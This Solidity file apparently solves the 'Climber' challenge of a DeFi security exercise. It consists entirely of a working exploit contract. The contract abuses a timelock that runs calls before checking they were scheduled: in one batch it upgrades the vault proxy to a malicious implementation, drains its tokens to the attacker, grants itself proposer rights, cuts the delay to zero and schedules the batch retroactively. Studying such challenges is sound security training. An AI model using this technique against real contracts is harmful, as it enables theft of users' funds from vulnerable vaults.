// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "../climber/ClimberTimelock.sol";
import "../climber/ClimberVault.sol";

contract NewImplementation is ClimberVault {
    constructor() {}

    function drainFunds(address tokenAddress, address recipient) external {
        uint256 bal = IERC20(tokenAddress).balanceOf(address(this));
        IERC20(tokenAddress).transfer(recipient, bal);
    }
}

contract ClimberAttack {
    ClimberTimelock timeLock;
    ClimberVault vault;
    NewImplementation drainer;
    address tokenAddress;
    address attacker;

    constructor(
        address payable _climberTimelockAddress,
        address _climberVaultAddress,
        address _tokenAddress
    ) {
        timeLock = ClimberTimelock(_climberTimelockAddress);
        vault = ClimberVault(_climberVaultAddress);
        tokenAddress = _tokenAddress;
        attacker = msg.sender;
        drainer = new NewImplementation();
    }

    /*
    TimeLock is owner of Vault
    0 - upgrade to new (malicious) implementation
    1 - drain funds from vault
    TimeLock is an ADMIN_ROLE
    2 - grant PROPOSER role to this contract
    3 - change delay to 0 seconds
    4 - schedule this entire call
    */
    address[] targets = new address[](5);
    uint256[] values = new uint256[](5);
    bytes[] dataElements = new bytes[](5);
    bytes32 salt = keccak256("hello");

    function attack() public {
        // 0 - upgrade to new (malicious) implementation
        targets[0] = address(vault);
        dataElements[0] = abi.encodeWithSignature("upgradeTo(address)", address(drainer));

        // 1 - drain funds from vault
        targets[1] = address(vault);
        dataElements[1] = abi.encodeWithSignature(
            "drainFunds(address,address)",
            tokenAddress,
            attacker
        );

        // 2 - grant PROPOSER role to this contract
        targets[2] = address(timeLock);
        dataElements[2] = abi.encodeWithSignature(
            "grantRole(bytes32,address)",
            timeLock.PROPOSER_ROLE(),
            address(this)
        );

        // 3 - change delay to 0 seconds
        targets[3] = address(timeLock);
        dataElements[3] = abi.encodeWithSignature("updateDelay(uint64)", 0);

        // 4 - schedule this entire call
        targets[4] = address(this);
        dataElements[4] = abi.encodeWithSignature("schedule()");

        // execute
        timeLock.execute(targets, values, dataElements, salt);
    }

    // need separate function to schedule otherwise dataElements would need to
    // contain a hash of itself
    function schedule() public {
        timeLock.schedule(targets, values, dataElements, salt);
    }
}
